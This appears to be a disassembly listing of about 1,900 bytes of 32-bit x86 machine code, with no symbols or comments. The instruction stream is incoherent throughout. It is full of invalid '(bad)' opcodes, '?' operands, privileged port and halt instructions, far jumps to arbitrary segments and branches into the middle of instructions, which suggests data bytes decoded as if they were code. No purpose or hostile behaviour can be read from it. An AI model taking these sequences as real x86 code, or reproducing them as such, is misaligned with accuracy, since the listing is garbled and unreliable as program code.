  411838:	xor    al,0xe3
  41183a:	pop    es
  41183b:	and    edi,esi
  41183d:	stos   BYTE PTR es:[edi],al
  41183e:	sbb    eax,0x33dc752c
  411843:	imul   ebp,DWORD PTR [eax+0xb985749],0x7c9ee7ca
  41184d:	das    
  41184e:	xchg   ebp,eax
  41184f:	xor    ch,BYTE PTR [edi+edx*2]
  411852:	xchg   BYTE PTR [eax-0x6ecbb482],ch
  411858:	clc    
  411859:	or     BYTE PTR ds:[ebp-0x58],cl
  41185d:	mov    cl,0x53
  41185f:	add    DWORD PTR [ebx+0x79],esi
  411862:	dec    eax
  411863:	dec    edx
  411864:	xor    esi,esp
  411866:	inc    ebx
  411867:	aas    
  411868:	xchg   ebp,eax
  411869:	sbb    al,dl
  41186b:	adc    ebp,DWORD PTR [esp+ebp*8]
  41186e:	cmc    
  41186f:	xchg   ecx,eax
  411870:	fs inc ebp
  411872:	jmp    0x411876
  411874:	xchg   edx,eax
  411875:	out    0xe2,eax
  411877:	icebp  
  411878:	or     ebx,edx
  41187a:	push   0xffffffcb
  41187c:	shl    bl,cl
  41187e:	cmp    dl,ah
  411880:	pop    ebx
  411881:	inc    edx
  411882:	cld    
  411883:	pop    edi
  411884:	and    eax,0x83443e68
  411889:	and    al,0x2f
  41188c:	adc    BYTE PTR [eax],ah
  41188e:	retf   0x3c9b
  411891:	test   al,0x53
  411893:	pop    ds
  411894:	cmp    cl,dl
  411896:	push   edx
  411897:	jg     0x41185b
  411899:	sub    BYTE PTR [ebp+0x3aa86536],cl
  41189f:	call   0x876f97fb
  4118a4:	push   eax
  4118a5:	dec    ecx
  4118a6:	out    0x55,al
  4118a8:	(bad)  
  4118a9:	iret   
  4118aa:	mov    bh,0x79
  4118ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118ad:	xchg   DWORD PTR [edx+0x7b9a85bd],ecx
  4118b3:	gs push cs
  4118b5:	aad    0x7c
  4118b7:	rcl    BYTE PTR [eax+0x35b78c78],1
  4118bd:	push   cs
  4118be:	jbe    0x4118f2
  4118c0:	pop    ss
  4118c1:	test   al,0x54
  4118c3:	sbb    ebx,DWORD PTR [eax-0x24dfdc9c]
  4118c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ca:	(bad)  
  4118cb:	jbe    0x4118c2
  4118cd:	mov    cl,0x78
  4118cf:	scas   al,BYTE PTR es:[edi]
  4118d0:	adc    al,0x8e
  4118d2:	or     ebp,DWORD PTR [edi]
  4118d4:	sub    eax,0x9e9270c4
  4118d9:	and    ebp,ebp
  4118db:	icebp  
  4118dc:	adc    al,0x4
  4118de:	xchg   ecx,eax
  4118df:	clc    
  4118e0:	pusha  
  4118e1:	cmp    BYTE PTR ds:0x21789192,al
  4118e7:	mov    ah,0x37
  4118e9:	mov    ah,0xb7
  4118eb:	imul   eax,DWORD PTR [esi],0x70e96bd0
  4118f1:	jb     0x411932
  4118f3:	mov    eax,es:0x5966fb30
  4118f9:	fsubr  DWORD PTR [ebx]
  4118fb:	add    BYTE PTR [edx-0x44],bl
  4118fe:	daa    
  4118ff:	jmp    0x4539:0xc69d0d05
  411906:	dec    ebx
  411907:	add    eax,0x923e2cb8
  41190c:	out    0x3d,al
  41190e:	imul   esi,DWORD PTR [ecx+edx*1-0x341fff1c],0x65
  411916:	cmc    
  411917:	sbb    dl,bh
  411919:	jp     0x4118a7
  41191b:	pop    ss
  41191c:	xchg   bh,ch
  41191e:	lock sbb ah,dl
  411921:	add    bh,BYTE PTR [ecx]
  411923:	xchg   ecx,eax
  411924:	mov    ebp,0xf6ed388d
  411929:	pop    esi
  41192a:	pop    ss
  41192b:	sbb    al,0xfc
  41192d:	mov    al,cl
  41192f:	test   eax,0xef895b9f
  411934:	cmp    cl,dl
  411936:	hlt    
  411937:	ins    DWORD PTR es:[edi],dx
  411938:	jo     0x411936
  41193a:	or     bl,BYTE PTR [ecx]
  41193c:	dec    ecx
  41193d:	hlt    
  41193e:	xchg   ebp,eax
  41193f:	xlat   BYTE PTR ds:[ebx]
  411940:	jo     0x411919
  411942:	inc    ebx
  411943:	mov    ds:0xb18a3c1a,al
  411948:	test   eax,0x2854d4d
  41194d:	cwde   
  41194e:	sub    ecx,0x5305769e
  411954:	mov    bh,0x53
  411956:	mov    ah,0xbc
  411958:	sub    DWORD PTR [esi+eiz*1-0x2eb98e23],edx
  41195f:	fidiv  WORD PTR [esi+ebx*8-0x4b]
  411963:	test   eax,0x52dde792
  411968:	mov    al,ds:0x3851e543
  41196d:	ins    DWORD PTR es:[edi],dx
  41196e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41196f:	sar    DWORD PTR [esi],0xa
  411972:	mov    dl,BYTE PTR [edi+0x4b]
  411975:	mul    DWORD PTR ds:0x79dab2c0
  41197b:	sbb    al,0xe1
  41197d:	les    ebx,FWORD PTR [edx-0x40964d7a]
  411983:	test   cl,0xc1
  411986:	jbe    0x4119fd
  411988:	jl     0x4119b2
  41198a:	rol    BYTE PTR [ebp+0x30],cl
  41198d:	outs   dx,BYTE PTR ds:[esi]
  41198e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41198f:	imul   ebx,DWORD PTR [edx],0xffffffc2
  411992:	jne    0x4119c9
  411994:	dec    edi
  411995:	fucom  st(0)
  411997:	jnp    0x41194e
  411999:	mov    dh,0x4d
  41199b:	inc    ebp
  41199c:	pusha  
  41199d:	mov    bl,0x45
  41199f:	mov    bl,0xd2
  4119a1:	shl    DWORD PTR [ebx],0x17
  4119a4:	test   al,0xce
  4119a6:	inc    esi
  4119a7:	loop   0x4119d6
  4119a9:	and    eax,0xbc2f9a62
  4119ae:	lea    ebp,[ecx-0x45]
  4119b1:	mul    dh
  4119b3:	adc    al,0xa2
  4119b5:	nop
  4119b6:	shl    DWORD PTR [edi-0x2a],cl
  4119b9:	sbb    DWORD PTR [ebp+0x3dfd710f],ecx
  4119bf:	leave  
  4119c0:	nop
  4119c1:	retf   
  4119c2:	jns    0x411a03
  4119c4:	mov    ds:0x125344f9,eax
  4119c9:	dec    edi
  4119ca:	cld    
  4119cb:	fistp  DWORD PTR [esi+edx*8]
  4119ce:	push   cs
  4119cf:	pop    esi
  4119d0:	ret    
  4119d1:	jl     0x411a4f
  4119d3:	les    edx,FWORD PTR ds:0xf60d5791
  4119d9:	hlt    
  4119da:	jmp    0xd106e77e
  4119df:	les    ecx,FWORD PTR [esi]
  4119e1:	ins    DWORD PTR es:[edi],dx
  4119e2:	mov    ?,WORD PTR [edx-0x70506d02]
  4119e8:	xchg   BYTE PTR ds:0xe02b42be,dl
  4119ee:	int3   
  4119ef:	mov    edx,0x1b918ca
  4119f4:	out    0xec,al
  4119f6:	sbb    BYTE PTR [ebp+0x1d],bl
  4119f9:	ret    
  4119fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fb:	aaa    
  4119fc:	inc    ebx
  4119fd:	push   0xc131bfd6
  411a02:	push   0xfb52fda4
  411a07:	outs   dx,BYTE PTR ds:[esi]
  411a08:	push   ds
  411a09:	inc    esi
  411a0a:	jnp    0x4119a6
  411a0c:	ins    BYTE PTR es:[edi],dx
  411a0d:	ss aam 0xb4
  411a10:	xchg   DWORD PTR [esi-0xef5b6cc],esi
  411a16:	pop    esi
  411a17:	xor    eax,0xbf3a6d95
  411a1c:	xchg   ebx,eax
  411a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1e:	outs   dx,BYTE PTR ds:[esi]
  411a1f:	cmp    esi,DWORD PTR [edx-0x64c5e8f2]
  411a25:	sahf   
  411a26:	pushf  
  411a27:	imul   DWORD PTR [esp+eiz*4+0x27]
  411a2b:	adc    eax,0x102f718e
  411a30:	adc    cl,BYTE PTR [eax-0x12]
  411a33:	(bad)  [edx]
  411a35:	jecxz  0x411a4f
  411a37:	sub    DWORD PTR [eax],ecx
  411a39:	imul   esi,DWORD PTR [ebx+0x14d5ba8b],0xf184fdf
  411a43:	mov    cl,0xf1
  411a45:	call   0x8160:0xba4cb65b
  411a4c:	inc    esi
  411a4d:	hlt    
  411a4e:	gs pop ss
  411a50:	and    eax,0x18d09949
  411a55:	inc    ebp
  411a56:	mov    edi,0xfb9b8ee
  411a5b:	and    bh,0xa8
  411a5e:	cs pop edi
  411a60:	inc    esi
  411a61:	push   0xb52e864a
  411a66:	mov    edx,0x76133c76
  411a6b:	inc    ebp
  411a6c:	jge    0x411a6d
  411a6e:	fiadd  WORD PTR [eax+eax*2]
  411a71:	test   al,0x21
  411a73:	and    cl,BYTE PTR [ebp+0x6]
  411a76:	cdq    
  411a77:	xchg   edx,eax
  411a78:	jnp    0x411a12
  411a7a:	rcl    DWORD PTR [esi+0x49d31d22],cl
  411a80:	sub    BYTE PTR [edi+edx*4],ah
  411a83:	pop    esp
  411a84:	inc    esp
  411a85:	jo     0x411ac9
  411a87:	mov    al,0x93
  411a89:	rol    dl,cl
  411a8b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  411a8d:	inc    edx
  411a8e:	push   ds
  411a8f:	test   BYTE PTR [edx-0x51],0x2f
  411a93:	out    0xc2,eax
  411a95:	fsub   QWORD PTR es:[edi+0x6d]
  411a99:	mov    esi,0x8c07dea7
  411a9e:	inc    ebx
  411a9f:	dec    esi
  411aa0:	jns    0x411ad5
  411aa2:	sbb    eax,0x9f61a3b5
  411aa7:	(bad)  
  411aa8:	jg     0x411b0a
  411aaa:	fwait
  411aab:	jl     0x411a3e
  411aad:	jle    0x411a3a
  411aaf:	(bad)  
  411ab1:	add    dh,dh
  411ab3:	sar    DWORD PTR [esi+0x2b],cl
  411ab6:	sbb    al,0x2e
  411ab8:	test   DWORD PTR [ebx],0x67813d
  411abe:	loope  0x411af4
  411ac0:	stos   DWORD PTR es:[edi],eax
  411ac1:	in     eax,dx
  411ac2:	jo     0x411af3
  411ac4:	push   ss
  411ac5:	out    0x95,eax
  411ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ac8:	sbb    BYTE PTR [ecx],dl
  411aca:	sub    bl,BYTE PTR [edi]
  411acc:	sub    esp,esi
  411ace:	jmp    0x411aa0
  411ad0:	jb     0x411a78
  411ad2:	push   ss
  411ad3:	data16 fwait
  411ad5:	(bad)  
  411ad6:	mov    ds:0xe00d3e0d,eax
  411adb:	mov    al,ds:0xc0eb7d34
  411ae0:	mov    edx,0x532d1cad
  411ae5:	xor    al,0xa5
  411ae7:	push   ecx
  411ae8:	daa    
  411ae9:	arpl   WORD PTR [ebx],ax
  411aeb:	fdivr  st(3),st
  411aed:	repz sbb ebx,eax
  411af0:	add    eax,0xd2c2f22e
  411af5:	scas   al,BYTE PTR es:[edi]
  411af6:	stos   DWORD PTR es:[edi],eax
  411af7:	(bad)  
  411af8:	(bad)  
  411af9:	dec    ecx
  411afa:	cli    
  411afb:	dec    cx
  411afd:	cmp    BYTE PTR [edi-0x2d],0xea
  411b01:	xchg   BYTE PTR [edi-0x772bc844],dh
  411b07:	add    al,0x88
  411b09:	push   0xfffffffc
  411b0b:	lds    ebx,FWORD PTR ds:0x6c666736
  411b11:	jmp    FWORD PTR [esi-0x6]
  411b14:	nop
  411b15:	push   ebx
  411b16:	mov    WORD PTR [ebx],es
  411b18:	cmp    DWORD PTR [ebx],esi
  411b1a:	enter  0x22ad,0x8
  411b1e:	inc    eax
  411b1f:	jmp    0xc87e:0x536a862e
  411b26:	int    0x64
  411b28:	pop    edx
  411b29:	shl    DWORD PTR [edx],1
  411b2b:	or     DWORD PTR [ebp-0x76],0x39
  411b2f:	int3   
  411b30:	lea    esi,[edi+eax*4+0x14]
  411b34:	inc    ebx
  411b35:	mov    dl,0x4b
  411b37:	mov    esp,0x4a98bc12
  411b3c:	(bad)  
  411b3d:	daa    
  411b3e:	adc    DWORD PTR ds:0xdf5e3798,0xffffff85
  411b45:	loope  0x411b86
  411b47:	repz rcl BYTE PTR [edx-0x5f],cl
  411b4b:	sub    eax,DWORD PTR [ebp+edx*1-0x1e]
  411b4f:	adc    esi,esp
  411b51:	add    al,0xf1
  411b53:	inc    esi
  411b54:	mov    ds:0x87629e38,eax
  411b59:	mov    ebp,0x2dbe01c6
  411b5e:	pop    es
  411b5f:	in     eax,dx
  411b60:	push   es
  411b61:	das    
  411b62:	fldenv [ecx+0x3cb4ca0]
  411b68:	mov    ch,0xde
  411b6a:	or     DWORD PTR [eax],0xfffffff7
  411b6d:	or     eax,eax
  411b6f:	iret   
  411b70:	pop    edx
  411b71:	out    dx,al
  411b72:	ds sbb al,0x73
  411b75:	and    cl,BYTE PTR [ecx-0x21]
  411b78:	fucom  st(4)
  411b7a:	into   
  411b7b:	iret   
  411b7c:	enter  0x207a,0x21
  411b80:	jbe    0x411b95
  411b82:	(bad)  
  411b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b85:	add    al,0x94
  411b87:	jmp    0x411b62
  411b89:	add    dh,al
  411b8b:	test   al,0xe1
  411b8d:	stos   DWORD PTR es:[edi],eax
  411b8e:	lods   al,BYTE PTR ds:[esi]
  411b8f:	xor    ebp,DWORD PTR [edx-0x3a8796d6]
  411b95:	stc    
  411b96:	out    dx,eax
  411b97:	adc    al,0x98
  411b99:	daa    
  411b9a:	add    edx,DWORD PTR [edx-0x4c]
  411b9d:	les    esp,FWORD PTR [ebx+ebp*4]
  411ba0:	xlat   BYTE PTR ds:[ebx]
  411ba1:	pop    ebx
  411ba2:	stos   BYTE PTR es:[edi],al
  411ba3:	sbb    BYTE PTR [eax],bl
  411ba5:	add    DWORD PTR [ebx],0xfffffff7
  411ba8:	add    BYTE PTR [esi+edi*4],bh
  411bab:	xchg   edx,eax
  411bac:	mov    WORD PTR [esi],?
  411bae:	imul   edx,edi,0x8bef8b0
  411bb4:	rcr    BYTE PTR [edi+edx*1],0x17
  411bb8:	xor    al,0xe
  411bba:	jp     0x411c37
  411bbc:	lods   al,BYTE PTR ds:[esi]
  411bbd:	cld    
  411bbe:	sbb    al,BYTE PTR [ebx+edx*4+0x247123a]
  411bc5:	mov    ds:0xcd1425a2,al
  411bca:	gs push 0x72
  411bcd:	es iret 
  411bcf:	loopne 0x411b5e
  411bd1:	rcl    BYTE PTR [ebx-0x6e2f8e8],0xaa
  411bd8:	xchg   esp,eax
  411bd9:	mov    esi,0xc12190e1
  411bde:	cs or  ch,bh
  411be1:	cld    
  411be2:	mov    ebx,0x76edbad2
  411be7:	jns    0x411c64
  411be9:	std    
  411bea:	jmp    0x3260:0x6c2b39da
  411bf1:	fsubrp st(3),st
  411bf3:	inc    edx
  411bf4:	mov    eax,0xf98f822e
  411bf9:	xchg   ebp,eax
  411bfa:	test   DWORD PTR [ebp+0xc13cbfa],0xc5aebd93
  411c04:	ret    
  411c05:	add    eax,0xa97bcbae
  411c0a:	and    edx,edi
  411c0c:	inc    ebp
  411c0d:	fs (bad) 
  411c10:	mov    al,0xec
  411c12:	xor    BYTE PTR [edi-0x3a9df9ac],bh
  411c18:	stc    
  411c19:	cmp    eax,0xd26aefb0
  411c1e:	(bad)  
  411c1f:	in     eax,0x73
  411c21:	mov    eax,0x78fdcc7d
  411c26:	xchg   edi,eax
  411c28:	push   edi
  411c29:	inc    esi
  411c2a:	shl    DWORD PTR [edi-0x74],1
  411c2d:	jns    0x411c57
  411c2f:	into   
  411c30:	or     eax,0xd938020c
  411c35:	shr    BYTE PTR [edi-0x1f],cl
  411c38:	popf   
  411c39:	cmp    eax,0x6d759ff0
  411c3e:	push   esi
  411c3f:	xrstor [esi+0x16fcee83]
  411c46:	push   ds
  411c47:	das    
  411c48:	outs   dx,BYTE PTR ds:[esi]
  411c49:	xor    al,BYTE PTR [edx+0x78]
  411c4c:	push   0xfffffffb
  411c4e:	cmp    DWORD PTR [bp+0x45],ebp
  411c52:	push   ebx
  411c53:	xor    edx,DWORD PTR [ecx+0x13d8badb]
  411c59:	xchg   ebx,eax
  411c5a:	sahf   
  411c5b:	mov    al,0xb
  411c5d:	cmp    eax,DWORD PTR ds:0x49388b66
  411c63:	xchg   ah,dh
  411c65:	cdq    
  411c66:	add    DWORD PTR [ebx+0x6b],0xffffff85
  411c6a:	lock retf 
  411c6c:	pop    ebp
  411c6d:	jne    0x411c74
  411c6f:	jmp    0x411c7f
  411c71:	out    dx,eax
  411c72:	push   ds
  411c73:	xor    DWORD PTR [eax+0xc78428b],esp
  411c79:	dec    eax
  411c7a:	push   esi
  411c7b:	pop    esi
  411c7c:	lods   eax,DWORD PTR ds:[esi]
  411c7d:	test   al,0xd8
  411c7f:	fwait
  411c80:	shl    dl,1
  411c82:	lock test al,0x71
  411c85:	scas   al,BYTE PTR es:[edi]
  411c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c87:	in     al,0xd4
  411c89:	cmp    ebp,DWORD PTR [edx]
  411c8b:	stos   DWORD PTR es:[edi],eax
  411c8c:	inc    esi
  411c8d:	ja     0x411cf3
  411c8f:	push   ebx
  411c90:	xchg   esi,eax
  411c91:	int    0xf6
  411c93:	jnp    0x411c4a
  411c95:	retf   0xb80f
  411c98:	aam    0x70
  411c9a:	test   BYTE PTR [ebp-0x66],ch
  411c9d:	rol    DWORD PTR [ebx-0x1b],1
  411ca0:	pop    ebx
  411ca1:	and    DWORD PTR [ecx+0x4fbe429a],ebp
  411ca7:	test   BYTE PTR [ebx],dl
  411ca9:	push   edi
  411caa:	cmp    eax,0x94e726f5
  411caf:	sbb    eax,0x31b195e2
  411cb4:	and    BYTE PTR [ebp-0x2fbb2fa0],bh
  411cba:	imul   ebp,DWORD PTR [edi-0x3c68d41a],0xffffff8d
  411cc1:	cmp    eax,0x89d6f608
  411cc6:	inc    esi
  411cc7:	repnz pop ebx
  411cc9:	add    al,0xd5
  411ccb:	jno    0x411ccf
  411ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cce:	cmp    DWORD PTR [ebp+edx*4+0x4a],esp
  411cd2:	xchg   edx,eax
  411cd3:	cmp    ah,cl
  411cd5:	mov    al,0xfc
  411cd7:	or     al,0x95
  411cd9:	sti    
  411cda:	cmp    eax,0xa50d3ec0
  411cdf:	jnp    0x411d4d
  411ce1:	(bad)  
  411ce2:	ret    
  411ce3:	mov    esp,0x96f0e67c
  411ce8:	ret    
  411ce9:	inc    ebx
  411cea:	and    ch,BYTE PTR [eax+0x7b]
  411ced:	push   0x8cdebcca
  411cf2:	push   edx
  411cf3:	lahf   
  411cf4:	xchg   edx,eax
  411cf5:	(bad)  
  411cf7:	das    
  411cf8:	dec    edi
  411cf9:	add    al,0xf1
  411cfb:	jno    0x411d20
  411cfd:	cmp    edi,ebp
  411cff:	or     dl,bl
  411d01:	jno    0x411d25
  411d03:	jne    0x411d5b
  411d05:	stos   BYTE PTR es:[edi],al
  411d06:	cmc    
  411d07:	xchg   ebp,eax
  411d08:	fcomip st,st(0)
  411d0a:	add    ah,BYTE PTR [edi+0x37b44c85]
  411d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d11:	inc    eax
  411d12:	push   edi
  411d13:	je     0x411ce3
  411d15:	xchg   edi,eax
  411d16:	sub    eax,0x1f60240d
  411d1b:	add    BYTE PTR [ebx],0x12
  411d1e:	dec    edx
  411d1f:	dec    eax
  411d20:	rcl    edi,cl
  411d22:	inc    eax
  411d23:	les    edi,FWORD PTR ds:0xe6697eb7
  411d29:	mov    bh,0x2a
  411d2b:	cwde   
  411d2c:	daa    
  411d2d:	pop    ds
  411d2e:	ffreep st(1)
  411d30:	stos   BYTE PTR es:[edi],al
  411d31:	rcr    DWORD PTR [eax+0x63],cl
  411d34:	outs   dx,BYTE PTR ds:[esi]
  411d35:	ins    DWORD PTR es:[edi],dx
  411d36:	and    eax,DWORD PTR [esi]
  411d38:	sub    ch,bh
  411d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d3b:	pop    edi
  411d3c:	mov    bl,BYTE PTR [edi+ecx*8-0x3634d61a]
  411d43:	push   0x51dbece7
  411d48:	cli    
  411d49:	adc    ah,BYTE PTR [edi+0x72]
  411d4c:	jge    0x411d9c
  411d4e:	shl    BYTE PTR [ebp+0x7ba747a0],0x16
  411d55:	imul   edi,DWORD PTR [esi],0x23957e0b
  411d5b:	xchg   esi,eax
  411d5c:	js     0x411db6
  411d5e:	sti    
  411d5f:	jle    0x411d9b
  411d61:	xchg   esi,eax
  411d62:	inc    edi
  411d63:	int3   
  411d64:	and    eax,0xb7aeab6
  411d69:	out    dx,al
  411d6a:	mov    ebp,0xc97ba3d5
  411d6f:	push   ebp
  411d70:	scas   al,BYTE PTR es:[edi]
  411d71:	inc    ebx
  411d72:	mov    bl,BYTE PTR [edx-0x4b]
  411d75:	adc    eax,DWORD PTR [edx+ebx*1+0x14825305]
  411d7c:	in     al,dx
  411d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d7e:	mov    cl,0xd7
  411d80:	push   cs
  411d81:	and    BYTE PTR [edi],bh
  411d83:	dec    ebx
  411d84:	xor    DWORD PTR [bx+di+0x4242],eax
  411d89:	enter  0xc2ed,0x80
  411d8d:	sbb    al,0x1e
  411d90:	outs   dx,BYTE PTR ds:[esi]
  411d91:	add    dh,dl
  411d93:	push   eax
  411d94:	mov    ds:0xde90d3f,al
  411d99:	pusha  
  411d9a:	mov    BYTE PTR [esi-0x6cc371f6],al
  411da0:	mov    ds:0xe3571091,al
  411da5:	mov    dl,0xfa
  411da7:	mov    cl,0x49
  411da9:	int3   
  411daa:	enter  0x1c74,0x95
  411dae:	enter  0xa28d,0x67
  411db2:	test   DWORD PTR [edi+0x14e871a5],esi
  411db8:	jae    0x411e0b
  411dba:	adc    edx,DWORD PTR fs:[ecx]
  411dbd:	outs   dx,DWORD PTR ds:[esi]
  411dbe:	loop   0x411da6
  411dc0:	nop
  411dc1:	ins    BYTE PTR es:[edi],dx
  411dc2:	leave  
  411dc3:	jo     0x411e19
  411dc5:	xor    eax,0x160a9db4
  411dca:	adc    edi,DWORD PTR [edx+0x67a58962]
  411dd0:	jbe    0x411e51
  411dd2:	or     eax,0x15d80938
  411dd7:	xor    eax,edi
  411dd9:	je     0x411e2c
  411ddb:	mov    ah,0xa4
  411ddd:	mov    BYTE PTR [eax],cl
  411ddf:	or     DWORD PTR [esi],0xffffffa8
  411de2:	clc    
  411de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de4:	and    DWORD PTR [ecx],esi
  411de6:	sbb    DWORD PTR [eax+0x2726912],ebx
  411dec:	adc    eax,0xbdd2e09d
  411df1:	mov    edx,0x1cd971f9
  411df6:	aam    0xd9
  411df8:	imul   ebx,eax,0xffffff98
  411dfb:	jns    0x411dba
  411dfd:	sub    ecx,DWORD PTR [ecx+edx*4-0x50c3d211]
  411e04:	nop
  411e05:	jl     0x411d89
  411e07:	add    eax,0x87488493
  411e0c:	pop    esi
  411e0d:	sbb    al,0x3d
  411e0f:	out    dx,al
  411e10:	in     eax,dx
  411e11:	inc    ebx
  411e12:	cwde   
  411e13:	retf   
  411e14:	data16 or dh,cl
  411e17:	push   edx
  411e18:	and    esi,edx
  411e1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e1b:	xor    eax,0xa0eb179c
  411e20:	add    BYTE PTR [ebx+0x4bee3a4a],ch
  411e26:	ror    DWORD PTR [eax+0x73],1
  411e29:	div    DWORD PTR [esi]
  411e2b:	pop    es
  411e2c:	xchg   cl,bl
  411e2e:	push   ecx
  411e30:	pop    esp
  411e31:	in     al,0x44
  411e33:	das    
  411e34:	sub    edx,DWORD PTR [esi-0x4740db53]
  411e3a:	dec    edi
  411e3b:	mov    ebp,0x74a91c92
  411e40:	mov    ebp,0x1f2e9888
  411e45:	jns    0x411ea5
  411e47:	retf   0xdf03
  411e4a:	jae    0x411dea
  411e4c:	cld    
  411e4d:	and    eax,0xe8a44163
  411e52:	cmp    eax,0x8d02ce6f
  411e57:	sub    al,0x8
  411e59:	add    eax,0xcb828a54
  411e5e:	int    0x48
  411e60:	je     0x411e85
  411e62:	mov    ds:0xdde2b6a9,al
  411e67:	push   es
  411e68:	adc    edi,DWORD PTR [edi+0x79234a34]
  411e6e:	and    BYTE PTR [ebx-0x58],cl
  411e71:	cdq    
  411e72:	ins    BYTE PTR es:[edi],dx
  411e73:	inc    ebx
  411e74:	push   ebp
  411e75:	jg     0x411e63
  411e77:	retf   
  411e78:	jae    0x411e6e
  411e7a:	pushf  
  411e7b:	repz dec esi
  411e7d:	or     cl,ch
  411e7f:	push   ebx
  411e80:	(bad)  
  411e81:	and    eax,0xaa12e56e
  411e86:	adc    al,BYTE PTR [eax]
  411e88:	sub    al,0x23
  411e8a:	(bad)  
  411e8b:	mov    dh,0xb4
  411e8d:	in     al,0xc1
  411e8f:	push   ss
  411e90:	mov    ch,0x34
  411e92:	int    0xbd
  411e94:	xchg   ebx,eax
  411e95:	adc    al,0xa4
  411e97:	aam    0x24
  411e99:	mov    ah,BYTE PTR [eax+0x285a6e66]
  411e9f:	hlt    
  411ea0:	jecxz  0x411ec0
  411ea2:	mov    BYTE PTR [esi],bl
  411ea4:	stos   DWORD PTR es:[edi],eax
  411ea5:	test   al,0x8b
  411ea7:	xchg   ebp,eax
  411ea8:	pop    edi
  411ea9:	xor    BYTE PTR ds:0xe5873932,dl
  411eaf:	lds    esi,FWORD PTR [eax+ecx*2+0x1800abac]
  411eb6:	shl    BYTE PTR [esi],0x9b
  411eb9:	(bad)  
  411eba:	in     eax,0x6a
  411ebc:	inc    esp
  411ebd:	mov    ah,0x32
  411ebf:	xor    al,0x46
  411ec1:	fstp   QWORD PTR [ecx]
  411ec3:	pop    eax
  411ec4:	adc    eax,0x4c44362
  411ec9:	mov    ah,0x4c
  411ecb:	adc    ecx,DWORD PTR [ebx+ebx*8]
  411ece:	add    al,0xf3
  411ed0:	test   DWORD PTR [eax+0x26],edx
  411ed3:	push   eax
  411ed4:	mov    dh,BYTE PTR [edx+edx*1]
  411ed7:	pop    es
  411ed8:	arpl   WORD PTR [ebx],sp
  411eda:	push   ecx
  411edb:	cwde   
  411edc:	nop
  411edd:	mov    dl,0xec
  411edf:	cdq    
  411ee0:	push   ebx
  411ee1:	and    ch,BYTE PTR [ebx]
  411ee3:	inc    ebx
  411ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee5:	sbb    al,0xda
  411ee7:	push   esi
  411ee8:	fcmovnu st,st(7)
  411eea:	in     al,dx
  411eeb:	jae    0x411ebc
  411eed:	sub    bh,bl
  411eef:	jecxz  0x411f6b
  411ef1:	inc    esi
  411ef2:	jmp    0x47be76dc
  411ef7:	mov    ebx,0x5b795567
  411efc:	push   0x56511ea8
  411f01:	ins    BYTE PTR es:[edi],dx
  411f02:	cmp    bh,bh
  411f04:	mov    esp,0x810f9b29
  411f09:	nop
  411f0a:	or     BYTE PTR [eax+0x78],0x10
  411f0e:	lahf   
  411f0f:	pop    esi
  411f10:	mov    eax,ebx
  411f12:	mov    DWORD PTR [ebx-0x2968b9ae],edi
  411f18:	add    BYTE PTR [ebp-0x34c46b2d],ch
  411f1e:	(bad)  
  411f1f:	sub    eax,0xf08b5bb9
  411f24:	sbb    WORD PTR [esi+0x54],ax
  411f28:	cmp    eax,0x329eff3f
  411f2d:	pusha  
  411f2e:	ret    0x84e3
  411f31:	sbb    dl,bl
  411f33:	popf   
  411f34:	push   ebx
  411f35:	or     BYTE PTR [ebp-0x7c],0x99
  411f39:	pop    ds
  411f3a:	sub    esi,DWORD PTR [edx-0x34f3bbfc]
  411f40:	ror    DWORD PTR [esi-0x7a],0x57
  411f44:	mov    esi,DWORD PTR [eax]
  411f46:	push   0x6e99cf10
  411f4b:	dec    esi
  411f4c:	mov    esp,0x21536fd0
  411f51:	push   eax
  411f52:	mov    DWORD PTR [eax-0x4f5eef6d],0x66e81def
  411f5c:	stos   BYTE PTR es:[edi],al
  411f5d:	cmp    BYTE PTR [esi],bh
  411f5f:	or     al,0x99
  411f61:	xchg   edi,eax
  411f62:	cld    
  411f63:	xchg   edi,eax
  411f64:	mov    eax,ds:0x60c8c216
  411f69:	int    0xc
  411f6b:	mov    bh,0x32
  411f6d:	inc    ebx
  411f6e:	sub    al,0x6e
  411f70:	adc    bl,BYTE PTR [edx]
  411f72:	pop    ds
  411f73:	pop    ds
  411f74:	fbstp  TBYTE PTR [ecx]
  411f76:	fmul   st(6),st
  411f78:	xor    BYTE PTR [ebp+esi*1-0x396846de],ah
  411f7f:	shrd   DWORD PTR [esi],edx,0x77
  411f83:	and    ah,dl
  411f85:	scas   eax,DWORD PTR es:[edi]
  411f86:	in     eax,dx
  411f87:	sub    BYTE PTR ds:0xa61ae1e5,dh
  411f8d:	daa    
  411f8e:	(bad)  [eax-0xcabdeff]
  411f94:	inc    ebx
  411f95:	mov    ebp,0xbe828c40
  411f9a:	inc    esp
  411f9b:	out    0x49,al
  411f9d:	mov    ecx,0xf6a70060
  411fa2:	std    
  411fa3:	cmc    
  411fa4:	add    eax,0xd46acb0d
  411fa9:	xchg   edx,eax
  411faa:	mov    BYTE PTR [edx-0x76],bh
  411fad:	mov    ebx,0xad2b586a
  411fb2:	fs inc ecx
  411fb4:	leave  
  411fb5:	rcr    BYTE PTR [esp+ebx*8-0x44],1
  411fb9:	mov    cl,al
  411fbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fbc:	arpl   WORD PTR [edi],di
  411fbe:	mov    DWORD PTR [ebp-0x54],esi
  411fc1:	jnp    0x412032
  411fc3:	mov    ebx,0xcdddbb13
  411fc8:	(bad)  
  411fc9:	sub    al,0x87
  411fcb:	jo     0x412000
  411fcd:	popf   
